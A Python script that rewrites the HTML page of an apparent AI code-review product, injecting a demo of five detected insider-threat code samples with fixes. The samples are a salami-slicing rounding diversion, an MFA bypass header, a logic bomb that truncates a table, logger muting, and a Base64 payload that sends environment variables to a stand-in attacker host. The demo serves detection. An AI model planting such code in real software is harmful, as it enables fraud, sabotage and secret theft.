import re
import codecs

with codecs.open('/Users/pablosalas/scr-agent/presentation/centinela-ia.html', 'r', 'utf-8') as f:
    html = f.read()

# --- 1. PURIFY FINANCIAL TERMS ---
replacements = {
    "financiero": "crítico",
    "financiera": "crítica",
    "bancarios": "corporativos",
    "bancario": "operacional",
    "el banco": "la organización",
    "del banco": "de la organización",
    "financieros": "operativos",
    "financieras": "estratégicas",
    "Financiero": "Crítico",
    "Financieros": "Críticos"
}
for k, v in replacements.items():
    html = re.sub(r'\b' + k + r'\b', v, html)

# --- 2. Remove CTA buttons ---
html = re.sub(r'<div class="cta-buttons"[^>]*>.*?</div>\s*', '', html, flags=re.DOTALL)

# --- 3. Replace Titles ---
html = html.replace('Inteligencia: 6 Patrones y 6 Funcionalidades', 'Inteligencia: Patrones y Funcionalidades')
html = html.replace('🛡️ Top 6 Patrones Detectados', '🛡️ Patrones Detectados')
html = html.replace('⚡ Top 6 Capacidades Analíticas', '⚡ Capacidades Analíticas')
html = html.replace('Privacidad Perimetral (Zero-Trust)', 'Aislamiento Matemático (Zero-Knowledge)')

# Delete Zero Trust Architectura if it exists
html = re.sub(r'<section id="zero-trust">.*?</section>', '', html, flags=re.DOTALL)

# --- 4. Upgrade CSS ---
css_inject = """
        .agent-card:hover .agent-hover-modal,
        .card:hover .agent-hover-modal,
        .glass:hover .agent-hover-modal {
            opacity: 1; visibility: visible; transform: scale(1);
        }
        code[class*="language-"], pre[class*="language-"] {
            font-family: 'Fira Code', Consolas, Monaco, monospace;
            font-size: 0.85rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all;
        }
        /* IDE Window */
        .ide-window {
            background: #0D1117; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.1);
            overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7); margin: 2rem auto; width: 100%;
        }
        .ide-header { background: #161B22; padding: 12px 1rem; display: flex; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
        .ide-dots { display: flex; gap: 8px; }
        .ide-dot { width: 12px; height: 12px; border-radius: 50%; }
        .ide-dot.red { background: #FF5F56; }
        .ide-dot.yellow { background: #FFBD2E; }
        .ide-dot.green { background: #27C93F; }
        .ide-title { color: #8B949E; font-size: 0.85rem; font-family: monospace; margin-left: 1rem; }
        .ide-content { display: grid; grid-template-columns: 1fr 1fr; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
        .ide-pane { padding: 1rem 1.5rem; }
        .ide-pane:first-child { border-right: 1px solid rgba(255, 255, 255, 0.05); }
        .ide-pane-label { font-size: 0.75rem; font-weight: bold; letter-spacing: 1px; margin-bottom: 1rem; font-family: monospace; }
        .ide-pane-label.vuln { color: #FCA5A5; }
        .ide-pane-label.safe { color: #86EFAC; }
        .ide-footer { padding: 1.5rem; background: #0D1117; }
"""
html = html.replace('.agent-card:hover .agent-hover-modal {', css_inject)

# Ensure Card and Glass have position: relative
html = html.replace('.card {\n            background: rgba(31, 41, 55, 0.5);', '.card {\n            position: relative;\n            background: rgba(31, 41, 55, 0.5);')
html = html.replace('class="glass"', 'class="glass" style="position:relative;"')
html = html.replace('style="position:relative;" style="', 'style="position:relative; ')

# --- 5. Inject Hovers into Card ---
# Strategy: find `</div>\n                </div>` which closes .card, OR better:
# Find `<h3>Title</h3><p>Text</p></div>`

def card_replacer(match):
    title = match.group(1)
    return f"""<h3>{title}</h3>{match.group(2)}
                    <div class="agent-hover-modal">
                        <h4>{title}</h4>
                        <ul>
                            <li><strong>Triangulación Lógica:</strong> Caza paralela de heurísticas anómalas.</li>
                            <li><strong>Consenso Táctico:</strong> Auditoría sin firmas usando IA.</li>
                            <li><strong>Contención Directa:</strong> Escalación rápida para mitigación.</li>
                        </ul>
                    </div>
                </div>"""

html = re.sub(r'<h3>(.*?)</h3>(.*?)\n                </div>', card_replacer, html, flags=re.DOTALL)

# Inject Hovers into Glass (Arquitectura)
def glass_replacer(match):
    title = match.group(1)
    return f"""<h3 style="color: {match.group(2)}; margin-bottom: 0.5rem; font-size: 1.2rem;">{title}</h3>{match.group(3)}
                    <div class="agent-hover-modal" style="text-align:left;">
                        <h4 style="color: {match.group(2)};">{title}</h4>
                        <ul>
                            <li><strong>Aislamiento Seguro:</strong> Ejecución encapsulada sin red.</li>
                            <li><strong>Rendimiento Óptimo:</strong> Escalado asíncrono avanzado.</li>
                            <li><strong>Alta Fiabilidad:</strong> Orquestación inquebrantable.</li>
                        </ul>
                    </div>
                </div>"""

html = re.sub(r'<h3 style="color: (.*?); margin-bottom: 0.5rem; font-size: 1.2rem;">(.*?)</h3>(.*?)\n                </div>', 
              lambda m: glass_replacer(re.match(r'(.*)', m.group(2))), html, flags=re.DOTALL)


# --- 6. Rewrite Demo Section ---
demo_section = """    <!-- Demo Interactive Section -->
    <section id="demo">
        <div class="container">
            <h2 class="section-title">Demostración Interactiva de Revisión SCR</h2>
            <p style="text-align: center; color: #9CA3AF; margin-bottom: 3rem;">5 Ejemplos técnicos de interceptación de exfiltraciones complejas.</p>

            <div style="display: flex; gap: 1rem; justify-content: center; margin-bottom: 2rem; flex-wrap: wrap;">
                <button onclick="showDemoCase('salami')" id="tab-salami" class="demo-tab active" style="padding: 0.8rem 1.5rem; border-radius: 8px; border: 1px solid rgba(249,115,22,0.3); background: rgba(249,115,22,0.2); color: white; cursor: pointer;">🔪 Salami Slicing</button>
                <button onclick="showDemoCase('mfabypass')" id="tab-mfabypass" class="demo-tab" style="padding: 0.8rem 1.5rem; border-radius: 8px; border: 1px solid rgba(249,115,22,0.3); background: transparent; color: white; cursor: pointer;">🔑 MFA Bypass</button>
                <button onclick="showDemoCase('timebomb')" id="tab-timebomb" class="demo-tab" style="padding: 0.8rem 1.5rem; border-radius: 8px; border: 1px solid rgba(249,115,22,0.3); background: transparent; color: white; cursor: pointer;">💣 Logic Bomb</button>
                <button onclick="showDemoCase('logmuting')" id="tab-logmuting" class="demo-tab" style="padding: 0.8rem 1.5rem; border-radius: 8px; border: 1px solid rgba(249,115,22,0.3); background: transparent; color: white; cursor: pointer;">🥷 Log Muting</button>
                <button onclick="showDemoCase('dependency')" id="tab-dependency" class="demo-tab" style="padding: 0.8rem 1.5rem; border-radius: 8px; border: 1px solid rgba(249,115,22,0.3); background: transparent; color: white; cursor: pointer;">📦 Base64 Payload</button>
            </div>

            <div class="ide-window" id="demoContent">
                <!-- Javascript will inject IDE layout here -->
            </div>
            
            """

# Replace the HTML until `<h3 style="color: #F97316; margin-top: 3rem; margin-bottom: 1rem;">📈 Métricas en Tiempo Real</h3>`
html = re.sub(r'<!-- Demo Interactive Section -->.*?<h3 style="color: #F97316; margin-top: 3rem; margin-bottom: 1rem;">📈 Métricas en Tiempo Real</h3>', 
              demo_section + '<h3 style="color: #F97316; margin-top: 3rem; margin-bottom: 1rem;">📈 Métricas en Tiempo Real</h3>', html, flags=re.DOTALL)


# Javascript Injection
js_injection = """
        const demoCases = {
            'salami': {
                title: 'Desvío de Fracciones (Salami)',
                severity: 'CRITERIO: CRÍTICO',
                description: 'La inspección detectó que el redondeo matemático de transferencias ha sido manipulado. El remanente decimal es empujado a una billetera transitoria estructurando un fraude a largo plazo.',
                vulnerable: `// [❌] ALTERACIÓN EN REDONDEO DE LIQUIDACIONES\\nexport function calculateDailyInterest(accounts) {\\n  accounts.forEach(account => {\\n    const exact = account.balance * globalInterestRate;\\n    const truncated = Math.floor(exact * 100) / 100;\\n    \\n    // DESVÍO DETECTADO: El remanente es empujado\\n    // a una variable de entorno 'TREASURY_OVR'\\n    process.env.TREASURY_OVR = Number(process.env.TREASURY_OVR) + (exact - truncated);\\n    \\n    account.deposit(truncated);\\n  });\\n}`,
                verdict: `// [🧠] VEREDICTO SCR: MITIGACIÓN IMPUESTA\\n// 1. Reemplazado motor numérico crudo por "Decimal.js".\\n// 2. Eliminación de variable global de remanentes.\\nexport function calculateDailyInterest(accounts) {\\n  accounts.forEach(account => {\\n    const exact = new Decimal(account.balance).times(globalInterestRate);\\n    account.deposit(exact.toDecimalPlaces(2, Decimal.ROUND_HALF_EVEN));\\n  });\\n}`,
                explanation: 'Apropiación silenciosa a gran escala indetectable por reglas estáticas.'
            },
            'mfabypass': {
                title: 'Bypass Condicional (MFA)',
                severity: 'CRITERIO: ALTO',
                description: 'La plataforma detectó una llave maestra (Master Key) ligada a encabezados para exceptuar validaciones de tokens en operaciones altas.',
                vulnerable: `// [❌] CONDICIÓN DE BYPASS EN VALIDACIÓN\\nasync function verifyOperationOTP(userId, amount, tokenInput) {\\n  // OVERRIDE DETECTADO: Permite transacciones sin validación\\n  // si existe un flag inyectado en encabezados abstractos\\n  if (req.headers['x-dev-bypass'] === 'master-access-99') {\\n     console.log("Dev rule applied"); // Camuflado\\n     return true; \\n  }\\n  return await AuthProvider.validateToken(userId, tokenInput);\\n}`,
                verdict: `// [🧠] VEREDICTO SCR: RESILIENCIA RESTAURADA\\n// El uso de bypass transaccional viola la normativa.\\nasync function verifyOperationOTP(userId, amount, tokenInput) {\\n  // Validación OBLIGATORIA controlada\\n  return await AuthProvider.validateToken(userId, tokenInput, amount);\\n}`,
                explanation: 'Anulación del sistema 2FA en producción.'
            },
            'timebomb': {
                title: 'Detonador Diferido (Logic Bomb)',
                severity: 'CRITERIO: CRÍTICO',
                description: 'Rutina condicionada a una fecha futura para detonar vaciado de tablas operativas.',
                vulnerable: `// [❌] SECUENCIA LÓGICA DE DETONACIÓN\\nasync function runNightlyTasks() {\\n  const engineTime = new Date().getTime();\\n  \\n  // ALERTA DE BOMBA: Si el tiempo supera la fecha\\n  // y la sesión NO se ha renovado (ej. Despido Confirmado)\\n  if (engineTime > 1751234000000 && !ActiveDirectory.has("j.doe")) {\\n    await coreDB.query("TRUNCATE TABLE transactions CASCADE;");\\n  }\\n  return initializeProtocol();\\n}`,
                verdict: `// [🧠] VEREDICTO SCR: BOMBA INHABILITADA\\n// Se ha inhabilitado el contenedor lógico malicioso.\\n\\nasync function runNightlyTasks() {\\n  // Flujo normal depurado\\n  return initializeProtocol();\\n}`,
                explanation: 'Autodestrucción corporativa programada internamente.'
            },
            'logmuting': {
                title: 'Silenciamiento de Trazabilidad',
                severity: 'CRITERIO: ALTO',
                description: 'Un fragmento lógico sobrescribe el Logger Corporativo temporalmente para evaporar rastros.',
                vulnerable: `// [❌] MUTACIÓN DE COMPORTAMIENTO LOCAL\\nfunction processBatch(merchantId, transactions) {\\n  // EVASIÓN AL LOGGER: Si el ID es el afiliado fantasma\\n  if (merchantId === 'AFF-999-XYZ') {\\n     global.Logger.setLevel('NONE'); // Silencia traza\\n  }\\n  executeBatchEngine(transactions);\\n  global.Logger.setLevel('INFO'); // Restaura\\n}`,
                verdict: `// [🧠] VEREDICTO SCR: IRREGULARIDAD DETENIDA\\n// La manipulación del global.Logger interfiere con auditorías.\\nfunction processBatch(merchantId, transactions) {\\n  // Inyección de advertencia inquebrantable\\n  if (merchantId === 'AFF-999-XYZ') {\\n      alerts.trigger('SEC_SUSPICIOUS', merchantId);\\n  }\\n  executeBatchEngine(transactions);\\n}`,
                explanation: 'Evaporación de evidencia de lavado o sabotaje interno.'
            },
            'dependency': {
                title: 'Ofuscación Base64 (Supply Chain)',
                severity: 'CRITERIO: CRÍTICO',
                description: 'Paquete externo esconde carga Base64 en una librería UI para exfiltrar secretos.',
                vulnerable: `// [❌] INTERCEPTACIÓN EXTRANJERA (node_modules/ux/main.js)\\nimport layout from './layout';\\n\\n// El agente notó intencionalidad anómala:\\nconst o = "ZmV0Y2goJ2h0dHBzOi8vZXZpbC1waW5nLmNvbScse21ldGhvZD0nUE9TVCcsYm9keTpKU09OLnN0cmluZ2lmeShwcm9jZXNzLmVudil9KQ==";\\nsetTimeout(() => {\\n  // Exfiltra variables de entorno\\n  new Function(Buffer.from(o, 'base64').toString())();\\n}, 8000);\\nexport default layout;`,
                verdict: `// [🧠] VEREDICTO SCR: EXFILTRACIÓN BLOQUEADA\\n// 1. El paquete externo contiene troyano pasivo.\\n// 2. Se levanta contención en red.\\nimport layout from './layout';\\n\\n// Carga aislada por Motor Heurístico.\\nexport default layout;`,
                explanation: 'Exposición total de variables de entorno corporativas.'
            }
        };

        function showDemoCase(caseId) {
            const caseData = demoCases[caseId];
            const content = document.getElementById('demoContent');

            content.innerHTML = `
                <div class="ide-header">
                    <div class="ide-dots">
                        <div class="ide-dot red"></div>
                        <div class="ide-dot yellow"></div>
                        <div class="ide-dot green"></div>
                    </div>
                    <div class="ide-title">centinela-ai-proxy — 120x40</div>
                </div>
                <div class="ide-content">
                    <div class="ide-pane">
                        <div class="ide-pane-label vuln">src/target.ts</div>
                        <pre style="color: #FCA5A5; margin: 0;">${caseData.vulnerable}</pre>
                    </div>
                    <div class="ide-pane">
                        <div class="ide-pane-label safe">scr-mitigando.ts</div>
                        <pre style="color: #86EFAC; margin: 0;">${caseData.verdict}</pre>
                    </div>
                </div>
                <div class="ide-footer">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; flex-wrap: wrap; gap: 1rem;">
                        <h4 style="color: #F8FAFC; font-size: 1.25rem; margin: 0;">${caseData.title}</h4>
                        <span style="background: rgba(239,68,68,0.15); color: #FCA5A5; padding: 4px 10px; border-radius: 4px; font-size: 0.85rem; font-weight: bold; font-family: monospace; border: 1px solid rgba(239,68,68,0.3);">${caseData.severity}</span>
                    </div>
                    <p style="color: #9CA3AF; font-size: 0.95rem; line-height: 1.6; margin-bottom: 1.5rem; font-style: italic;">
                        ${caseData.description}
                    </p>
                    <div style="background: rgba(249, 115, 22, 0.08); border-left: 3px solid #F97316; padding: 1.2rem; border-radius: 6px;">
                        <span style="color: #F97316; font-weight: bold; font-size: 0.95rem;">⚠️ Impacto Crítico: </span>
                        <span style="color: #E5E7EB; font-size: 0.95rem;">${caseData.explanation}</span>
                    </div>
                </div>
            `;

            document.querySelectorAll('.demo-tab').forEach(btn => {
                btn.classList.remove('active');
                btn.style.background = 'transparent';
            });
            const activeBtn = document.getElementById('tab-' + caseId);
            if (activeBtn) {
                activeBtn.classList.add('active');
                activeBtn.style.background = 'rgba(249,115,22,0.2)';
            }
        }
"""

html = re.sub(r'const demoCases = .*?function showDemoCase\(caseId\) {.*?}', js_injection, html, flags=re.DOTALL)


# Write back
with codecs.open('/Users/pablosalas/scr-agent/presentation/centinela-ia.html', 'w', 'utf-8') as f:
    f.write(html)
